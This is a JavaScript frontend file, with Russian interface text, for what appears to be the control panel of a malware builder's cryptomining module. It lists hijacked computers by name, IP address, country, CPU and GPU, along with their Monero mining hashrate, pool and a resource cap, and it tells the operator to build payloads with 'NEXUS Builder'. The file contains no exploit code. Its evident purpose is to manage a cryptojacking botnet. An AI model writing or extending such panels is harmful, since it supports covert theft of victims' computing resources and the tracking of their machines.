// ── Compute Модули Dashboard Frontend ─────────────────────────────────────────

if (!requireLogin()) {
  throw new Error('Not authenticated');
}

// Рендерим сайдбар с активным пунктом compute
const sidebarSlot = document.getElementById('sidebarSlot');
if (sidebarSlot) {
  sidebarSlot.innerHTML = renderHeader('compute');
}

let allWorkers = [];
let autoRefreshInterval = null;
let isFetching = false;

// Загрузка статистики вычислений
async function loadComputeStats() {
  if (isFetching) return;
  isFetching = true;

  try {
    const res = await apiFetch('/api/compute-stats');
    if (!res.ok) {
      throw new Error(`HTTP error ${res.status}`);
    }
    const data = await res.json();
    if (data.success) {
      updateSummary(data.summary || {});
      allWorkers = data.workers || [];
      filterComputeWorkers();
    }
  } catch (err) {
    console.error('Error loading compute stats:', err);
    if (err.message !== 'auth' && err.message !== 'auth_bg') {
      const container = document.getElementById('computeWorkersContainer');
      if (container && allWorkers.length === 0) {
        container.innerHTML = `
          <div class="settings-card" style="text-align: center; padding: 2.5rem 1rem;">
            <div style="font-size: 2rem; margin-bottom: 0.5rem;">⚠️</div>
            <div style="font-weight: 700; color: #fff; margin-bottom: 0.5rem;">Не удалось загрузить данные Compute модулей</div>
            <div style="font-size: 0.85rem; color: var(--text-muted); margin-bottom: 1rem;">Проверьте связь с сервером или повторите попытку</div>
            <button class="btn-primary" onclick="loadComputeStats()">Повторить попытку</button>
          </div>
        `;
      }
    }
  } finally {
    isFetching = false;
  }
}

function updateSummary(summary) {
  const sActive = document.getElementById('sActiveWorkers');
  const sCpu = document.getElementById('sCpuHashrate');
  const sGpu = document.getElementById('sGpuHashrate');
  const sTotal = document.getElementById('sTotalOnline');

  if (sActive) sActive.textContent = summary.activeComputeWorkers ?? 0;
  if (sCpu) sCpu.textContent = summary.cpuTotalHashrate || '0.00 kH/s';
  if (sGpu) sGpu.textContent = summary.gpuTotalHashrate || '0.0 MH/s';
  if (sTotal) sTotal.textContent = `${summary.totalOnline ?? 0} / ${summary.totalComputers ?? 0}`;
}

function filterComputeWorkers() {
  const searchInput = document.getElementById('searchCompute');
  const filterAlgo = document.getElementById('filterAlgo');
  const filterStatus = document.getElementById('filterStatus');

  const q = (searchInput ? searchInput.value : '').trim().toLowerCase();
  const algo = filterAlgo ? filterAlgo.value : 'all';
  const status = filterStatus ? filterStatus.value : 'all';

  const filtered = allWorkers.filter(w => {
    // Поиск
    if (q) {
      const matchName = (w.computerName || '').toLowerCase().includes(q);
      const matchWorker = (w.worker || '').toLowerCase().includes(q);
      const matchAlgo = (w.algorithm || '').toLowerCase().includes(q);
      const matchCpu = (w.cpu || '').toLowerCase().includes(q);
      const matchGpu = (w.gpu || '').toLowerCase().includes(q);
      const matchIp = (w.ip || '').toLowerCase().includes(q);
      if (!matchName && !matchWorker && !matchAlgo && !matchCpu && !matchGpu && !matchIp) {
        return false;
      }
    }

    // Фильтр по алгоритмам
    if (algo === 'randomx') {
      if (!(w.algorithm || '').toLowerCase().includes('randomx') || (w.algorithm || '').toLowerCase().includes('dual') || (w.algorithm || '').toLowerCase().includes('etc')) return false;
    } else if (algo === 'etchash') {
      if (!(w.algorithm || '').toLowerCase().includes('etc')) return false;
    } else if (algo === 'dual') {
      if (!(w.algorithm || '').toLowerCase().includes('+') && !(w.algorithm || '').toLowerCase().includes('dual')) return false;
    }

    // Фильтр по статусу
    if (status === 'running') {
      if (!w.isOnline || w.status !== 'Running') return false;
    } else if (status === 'offline') {
      if (w.isOnline && w.status === 'Running') return false;
    }

    return true;
  });

  renderWorkers(filtered);
}

function renderWorkers(workers) {
  const container = document.getElementById('computeWorkersContainer');
  if (!container) return;

  if (workers.length === 0) {
    container.innerHTML = `
      <div class="settings-card" style="text-align: center; padding: 3rem 1rem;">
        <div style="font-size: 2.5rem; margin-bottom: 0.75rem;">⚡</div>
        <div style="font-weight: 700; color: #fff; font-size: 1.1rem; margin-bottom: 0.4rem;">Воркеры не найдены</div>
        <div style="font-size: 0.85rem; color: var(--text-muted); max-width: 480px; margin: 0 auto;">
          На данный момент нет активных Compute-воркеров, соответствующих заданным критериям фильтрации. Соберите билд в NEXUS Builder с включенным модулем вычислений.
        </div>
      </div>
    `;
    return;
  }

  let html = `<div class="compute-grid">`;

  for (const w of workers) {
    const isOnline = w.isOnline;
    const isRunning = w.status === 'Running' || isOnline;
    const statusDot = isRunning ? '<span class="pulse-dot-green"></span>' : '<span class="pulse-dot-gray"></span>';
    const statusBadge = isRunning 
      ? `<span class="badge badge-valid" style="display:inline-flex; align-items:center; gap:5px;">${statusDot} Активен</span>`
      : `<span class="badge badge-invalid" style="display:inline-flex; align-items:center; gap:5px;">${statusDot} Офлайн</span>`;

    const isGpu = (w.gpu && w.gpu !== '—') || (w.algorithm && w.algorithm.toLowerCase().includes('etc'));
    const algoBadgeClass = isGpu ? 'compute-speed-badge compute-gpu-badge' : 'compute-speed-badge';

    html += `
      <div class="compute-card">
        <div class="compute-card-header">
          <div>
            <div class="compute-pc-title">
              <span>💻</span>
              <span title="${escapeHtml(w.computerName)}">${escapeHtml(w.computerName)}</span>
            </div>
            <div style="font-size: 0.78rem; color: var(--text-muted); margin-top: 2px;">
              IP: ${escapeHtml(w.ip)} • ${escapeHtml(w.country)}
            </div>
          </div>
          <div>${statusBadge}</div>
        </div>

        <div style="background: rgba(0,0,0,0.25); border-radius: 8px; padding: 10px 12px; display: flex; align-items: center; justify-content: space-between;">
          <div>
            <div style="font-size: 0.72rem; text-transform: uppercase; letter-spacing: 0.5px; color: var(--text-muted); font-weight: 700;">Скорость / Хешрейт</div>
            <div style="font-size: 1.15rem; font-weight: 800; color: #fff; font-family: 'JetBrains Mono', monospace; margin-top: 2px;">
              ${escapeHtml(w.hashrate || '0 H/s')}
            </div>
          </div>
          <div class="${algoBadgeClass}">
            ⚡ ${escapeHtml(w.algorithm || 'RandomX')}
          </div>
        </div>

        <div style="display: flex; flex-direction: column; gap: 2px;">
          <div class="compute-meta-row">
            <span>Процессор (CPU):</span>
            <span class="compute-meta-val" title="${escapeHtml(w.cpu)}">${escapeHtml(w.cpu || '—')}</span>
          </div>
          ${w.gpu && w.gpu !== '—' ? `
          <div class="compute-meta-row">
            <span>Видеокарта (GPU):</span>
            <span class="compute-meta-val" style="color: #c084fc;" title="${escapeHtml(w.gpu)}">${escapeHtml(w.gpu)}</span>
          </div>` : ''}
          <div class="compute-meta-row">
            <span>Лимит ресурсов:</span>
            <span class="compute-meta-val">${escapeHtml(w.limit || 50)}% Max</span>
          </div>
          <div class="compute-meta-row">
            <span>Пул / Сервер:</span>
            <span class="compute-meta-val" style="font-size: 0.78rem;" title="${escapeHtml(w.pool)}">${escapeHtml(w.pool || 'pool.supportxmr.com:3333')}</span>
          </div>
          <div class="compute-meta-row">
            <span>Шары (Shares):</span>
            <span class="compute-meta-val" style="color: #10b981;">${escapeHtml(w.shares || '0/0')}</span>
          </div>
          <div class="compute-meta-row">
            <span>Последний отклик:</span>
            <span class="compute-meta-val">${fmtDate(w.lastSeen)}</span>
          </div>
        </div>
      </div>
    `;
  }

  html += `</div>`;
  container.innerHTML = html;
}

function toggleAutoRefresh(enabled) {
  if (autoRefreshInterval) {
    clearInterval(autoRefreshInterval);
    autoRefreshInterval = null;
  }
  if (enabled) {
    autoRefreshInterval = setInterval(loadComputeStats, 5000);
  }
}

// Запуск при старте
loadComputeStats();
toggleAutoRefresh(true);
